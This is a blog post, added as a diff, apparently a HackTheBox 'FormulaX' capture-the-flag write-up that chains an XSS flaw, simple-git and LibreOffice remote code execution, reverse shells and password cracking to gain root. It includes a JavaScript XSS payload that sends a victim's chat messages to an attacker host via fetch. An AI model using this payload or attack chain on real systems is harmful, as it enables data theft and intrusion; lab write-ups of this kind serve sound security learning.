@@ -1,0 +1,168 @@
+---
+layout: post
+title: "FormulaX fa3bdf2c47804a049a31fb516f6a4800"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# FormulaX
+
+HackTheBox: Easy
+
+## 1: Enumeration
+
+- nmap scanning
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled.png' | relative_url }})
+
+There is a http service, and ssh running, we may need to find some credentials to log on.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_1.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_2.png' | relative_url }})
+
+Here we found the html and js files it will help us to understand the functionality of the web application.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_3.png' | relative_url }})
+
+## 2: User flag
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_4.png' | relative_url }})
+
+Digging into the web application we realize this section with a XSS vulnerability
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_5.png' | relative_url }})
+
+Using the same code that we analyze early we will use it to disclose information using the server response
+
+```jsx
+let value;
+const res = axios.get(`/user/api/chat`);
+const socket = io('/',{withCredentials: true});
+//listening for the messages
+socket.on('message', (my_message) => {  
+//console.log("Received From Server: " + my_message)  
+// Show_messages_on_screen_of_Server(my_message)  
+fetch("http://ip/tricp" + my_message );
+})
+// rewrite the typing_chat function to only send message 'history'
+const typing_chat_new = () => {  
+value = "history"; 
+//document.getElementById('user_message').value  
+if (value) {    
+	// sending the  messages to the server    
+	socket.emit('client_message', value)    
+	Show_messages_on_screen_of_Client(value);    
+	// here we will do out socket things..    
+	document.getElementById('user_message').value = ""  }  
+else {    alert("Cannot send Empty Messages"); 
+ }}
+ // send message
+ typing_chat_new()
+```
+
+We need to use a resource from the web application to make the disclose information effective, then we load the .js file that we just create.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_6.png' | relative_url }})
+
+A subdomain were found successfully.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_7.png' | relative_url }})
+
+We have a new section powered by simple-git, after some research we found a RCE but the problem were that we can only execute one single command per sent request, so the best option was call a file with a reverse shell and it will execute it automatically.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_8.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_9.png' | relative_url }})
+
+Reverse shell to a linux OS
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_10.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_11.png' | relative_url }})
+
+We found some information about the data base, so we used some mongo commands looking for some credentials as we mentioned before.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_12.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_13.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_14.png' | relative_url }})
+
+Password found, using john to crack it.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_15.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_16.png' | relative_url }})
+
+## 3: Priv esc
+
+We enumerate using linpeas, it is necessary use sh to execute, otherwise it won’t execute it.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_17.png' | relative_url }})
+
+We have discovered some local services running but we don’t want to waste time looking for each one, we hace a clue in the config file of librenms
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_18.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_19.png' | relative_url }})
+
+Port forwarding using ssh
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_20.png' | relative_url }})
+
+In this part we can log in adding a user, we have permissions but we don’t know where is the adduser.php file.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_21.png' | relative_url }})
+
+May be in this path there is something
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_22.png' | relative_url }})
+
+Here we can’t see the file but we can call it so we search the command for add a admin user.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_23.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_24.png' | relative_url }})
+
+Add the domain to the local host and go to template directory
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_25.png' | relative_url }})
+
+Create a template with the same reverse shell we use in the user flag
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_26.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_27.png' | relative_url }})
+
+No we are librenms user, use env to see credentials for kai_relay.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_28.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_29.png' | relative_url }})
+
+Now we are in sudoers users, and we can see a service running LibreOffice
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_30.png' | relative_url }})
+
+There is another RCE on this service
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_31.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_32.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_33.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_34.png' | relative_url }})
+
+Give all permission to rev.sh and set the reverse shell path. The we connect to the target, and listening on the specific port we got a root shell
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_35.png' | relative_url }})
+
+We use this exploit, but i modified to custom the ip address and the target port.
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_36.png' | relative_url }})
+
+Machine pwned!!!
+
+![Untitled]({{ '/assets/images/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2/9ed6ffc6-a6a0-4445-926d-d1c01568c2ad-export-884a5725-04bb-409c-b07a-2f0e9ce7c9e2_Untitled_37.png' | relative_url }})
